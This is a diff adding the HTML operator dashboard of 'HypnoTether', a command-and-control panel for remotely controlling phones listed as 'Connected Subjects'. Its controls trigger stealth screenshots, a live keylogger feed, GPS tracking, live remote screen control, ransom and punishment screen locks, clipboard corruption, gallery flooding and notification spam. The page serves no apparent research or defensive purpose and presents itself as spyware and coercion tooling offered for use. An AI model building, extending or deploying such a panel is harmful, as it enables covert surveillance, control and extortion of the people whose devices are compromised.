@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HypnoTether - Luxury C2</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="background-anim">
+        <div class="orb orb-1"></div>
+        <div class="orb orb-2"></div>
+        <div class="orb orb-3"></div>
+    </div>
+
+    <header class="glass-header">
+        <h1>Hypno<span class="accent">Tether</span> C2</h1>
+        <div class="status-indicator">
+            <span class="ping-dot"></span> Server Online
+        </div>
+    </header>
+
+    <main class="dashboard-container">
+        <!-- Sidebar: Attached Devices -->
+        <aside class="device-list glass-panel">
+            <h2>Connected Subjects</h2>
+            <ul id="device-ul">
+                <li class="empty-state">Waiting for connections...</li>
+            </ul>
+        </aside>
+
+        <!-- Main Control Area -->
+        <section class="control-center glass-panel">
+            <div class="top-bar">
+                <h2 id="selected-target-lbl">Focus: <span class="accent">Global Broadcast</span></h2>
+                <button id="broadcast-btn" class="btn secondary">Select All</button>
+            </div>
+
+            <div class="modules-grid">
+                
+                <!-- Command Module: Sensory Overload -->
+                <div class="card">
+                    <h3>Sensory Overload</h3>
+                    <div class="btn-group">
+                        <button class="btn" onclick="sendCommand('flash_screen', { count: 10 })">Strobe Flash</button>
+                        <button class="btn" onclick="sendCommand('vibrate', { duration: 5000 })">Heavy Buzz</button>
+                        <button class="btn primary full-width" style="margin-top:5px" onclick="sendCommand('spiral_video', { url: window.lastUploadedMedia })">Force Hypno-Spiral</button>
+                    </div>
+                </div>
+
+                 <!-- Command Module: Web/App Interaction -->
+                 <div class="card">
+                    <h3>Digital Restraint</h3>
+                    <input type="text" id="url-input" placeholder="https://throne.com/..." style="margin-bottom: 5px;">
+                    <button class="btn full-width" onclick="sendCommand('open_url', { url: document.getElementById('url-input').value })">Inject Web URL</button>
+                    
+                    <input type="text" id="clip-input" placeholder="Obeisance mantra..." style="margin-top: 15px; margin-bottom: 5px;">
+                    <button class="btn secondary full-width" onclick="sendCommand('infect_clipboard', { text: document.getElementById('clip-input').value })">Corrupt Clipboard</button>
+                </div>
+
+                <!-- Command Module: Payload Delivery -->
+                <div class="card span-2">
+                    <h3>Asset Deployment</h3>
+                    
+                    <!-- Feature: Wallpaper -->
+                    <div style="margin-bottom: 15px; padding-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                        <h4 style="color:#0f6; margin-top:0; margin-bottom:5px;">System Wallpaper Injector</h4>
+                        <div class="upload-area" style="display:flex; gap:10px;">
+                            <input type="file" id="uploadWallpaper" accept="image/*" style="margin:0;"/>
+                            <button class="btn primary" onclick="uploadSpecific('uploadWallpaper', 'change_wallpaper')">Bind Wallpaper</button>
+                        </div>
+                    </div>
+
+                    <!-- Feature: Audio -->
+                    <div style="margin-bottom: 15px; padding-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                        <h4 style="color:#0f6; margin-top:0; margin-bottom:5px;">Audio Injection (MP3)</h4>
+                        <div class="upload-area" style="display:flex; gap:10px;">
+                            <input type="file" id="uploadAudio" accept="audio/*" style="margin:0;"/>
+                            <button class="btn primary" onclick="uploadSpecific('uploadAudio', 'play_audio')">Stream Audio</button>
+                            <button class="btn danger" style="padding:0 10px;" onclick="sendCommand('stop_audio', null)">Mute</button>
+                        </div>
+                    </div>
+
+                    <!-- Feature: Gallery Flood -->
+                    <div>
+                        <h4 style="color:#ff105f; margin-top:0; margin-bottom:5px;">Gallery Flooder Protocol</h4>
+                        <div class="upload-area" style="display:flex; gap:10px;">
+                            <input type="file" id="uploadGallery" accept="image/*" style="margin:0;"/>
+                            <button class="btn danger" onclick="uploadSpecific('uploadGallery', 'flood_gallery')">Flood Target Gallery</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- NEW: Isolation & Surveillance Module -->
+                <div class="card">
+                    <h3>Surveillance & Isolation</h3>
+                    <button class="btn secondary full-width" style="margin-bottom:10px" onclick="sendCommand('take_screenshot', null)">Stealth Screenshot</button>
+                    
+                    <h4 style="margin-bottom: 5px;">Screen Denial Routines</h4>
+                    <div class="btn-group">
+                        <button class="btn secondary" onclick="sendCommand('native_lock', null)">Native Lock</button>
+                        <button class="btn danger" onclick="sendCommand('lock_screen', null)">Ransom Lock</button>
+                        <button class="btn" style="border-color:#0f6" onclick="sendCommand('unlock_screen', null)">Unlock</button>
+                    </div>
+                    
+                    <button class="btn danger full-width" style="margin-top: 5px;" onclick="sendCommand('punishment_lock', { duration: 300000 })">5-Min Hard Punishment Lock</button>
+                    <button class="btn danger full-width" style="margin-top: 10px;" onclick="sendCommand('spam_notifs', null)">Notification Terror</button>
+
+                    <h4 style="margin-top: 15px; margin-bottom: 5px;">Floating Popups</h4>
+                    <div class="upload-area" style="display:flex; gap:10px; margin-bottom: 10px;">
+                        <input type="file" id="uploadPopup" accept="image/*" style="margin:0; max-width: 60%;"/>
+                        <button class="btn primary" style="flex:1" onclick="uploadSpecific('uploadPopup', 'spawn_popup')">Spawn Image</button>
+                    </div>
+                    <button class="btn danger full-width" onclick="sendCommand('kill_popups', null)">Kill All Popups</button>
+                </div>
+                
+                <!-- NEW: Behavioral Modifiers -->
+                <div class="card">
+                    <h3>Behavioral Constraints</h3>
+                    <label class="toggle-container">
+                        <input type="checkbox" id="block-apps-toggle" onchange="toggleAppBlock()">
+                        <span class="checkmark"></span>
+                        Enable Social Blacklist
+                    </label>
+                    <label class="toggle-container">
+                        <input type="checkbox" id="punish-mode" onchange="togglePunish()">
+                        <span class="checkmark"></span>
+                        Punish on Screen Unlock
+                    </label>
+                    <hr class="separator"/>
+                    <input type="text" id="notif-input" placeholder="Message content...">
+                    <button class="btn primary full-width" style="margin-top:5px" onclick="sendNotif()">Push Dominatrix Alert</button>
+                </div>
+                
+                <!-- NEW: C2 Omnipotence Core -->
+                <div class="card span-3" style="border-color: var(--amethyst);">
+                    <h3 style="color:var(--text-primary);">Spyware Protocol & Live VNC</h3>
+                    
+                    <div style="display:flex; justify-content:space-between; gap:20px; flex-wrap: wrap;">
+                        <div style="flex:1; min-width: 250px;">
+                            <h4 style="color:var(--amethyst); margin-bottom:10px;">Device Navigation</h4>
+                            <div class="btn-group">
+                                <button class="btn" onclick="sendCommand('remote_action', { action: 'home' })">Force HOME</button>
+                                <button class="btn" onclick="sendCommand('remote_action', { action: 'back' })">Force BACK</button>
+                                <button class="btn" onclick="sendCommand('remote_action', { action: 'recents' })">Force RECENTS</button>
+                            </div>
+                            
+                            <h4 style="color:var(--neon-pink); margin-top:20px; margin-bottom:10px;">Location Tracking (GPS)</h4>
+                            <button class="btn primary full-width" onclick="sendCommand('get_location', null)">Request Coordinates</button>
+                            <div id="gps-result" style="margin-top:10px; font-size:0.85em; color:#fff;"></div>
+                        </div>
+                        
+                        <div style="flex:2; min-width: 300px; border-left:1px solid rgba(255,255,255,0.1); padding-left:20px;">
+                             <div style="display:flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                                 <h4 style="color:#0f6; margin:0;">Live Screen Feed (VNC)</h4>
+                                 <div>
+                                     <button class="btn primary" onclick="startStream()">Start Stream</button>
+                                     <button class="btn danger" onclick="stopStream()">Stop</button>
+                                 </div>
+                             </div>
+                             
+                             <div id="vnc-container" style="position: relative; width: 100%; max-width: 350px; margin: 0 auto; border: 2px solid #0f6; border-radius: 8px; overflow: hidden; aspect-ratio: 9/19; background: #000; cursor: crosshair;" onclick="handleVncClick(event)">
+                                 <img id="vnc-screen" src="" style="width: 100%; height: 100%; object-fit: contain; pointer-events: none;" alt="Waiting for stream..."/>
+                                 <div id="vnc-overlay" style="position: absolute; top:50%; left:0; width:100%; text-align:center; color: #0f6; font-family: monospace; pointer-events: none;">NO SIGNAL<br>Click Start Stream</div>
+                             </div>
+                             <p style="font-size: 0.8em; color: gray; text-align: center; margin-top: 5px;">Click anywhere on the stream above to simulate a tap on their screen.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card span-1" style="border-color: #ff105f;">
+                    <h3 style="color:#ff105f;">Live Keylogger Feed</h3>
+                    <div id="keylogger-feed" style="height: 150px; background: rgba(0,0,0,0.8); border-radius: 5px; padding: 10px; overflow-y: auto; font-family: monospace; font-size: 0.85em; color: lime;">
+                        > Waiting for interception...
+                    </div>
+                </div>
+
+            </div> <!-- End modules grid upper -->
+
+            <!-- Live Chat Module -->
+            <div class="card" style="margin-top: 20px;">
+                <h3>Live Tether Chat</h3>
+                <div id="chat-window" style="height: 200px; background: rgba(0,0,0,0.5); border: 1px solid var(--glass-border); border-radius: 6px; overflow-y: auto; padding: 10px; margin-bottom: 15px; font-size: 0.9em; display: flex; flex-direction: column; gap: 8px;">
+                    <div style="color: var(--text-muted); text-align: center; margin-top: auto; margin-bottom: auto;">Select a target and start typing to initialize the chat override.</div>
+                </div>
+                <div style="display: flex; gap: 10px;">
+                    <input type="text" id="chat-input" placeholder="Dominatrix commands..." style="margin-bottom: 0;">
+                    <button class="btn primary" onclick="sendChatMessage()">Send to Sub</button>
+                    <button class="btn danger" onclick="sendCommand('close_chat', null)">Force Close</button>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
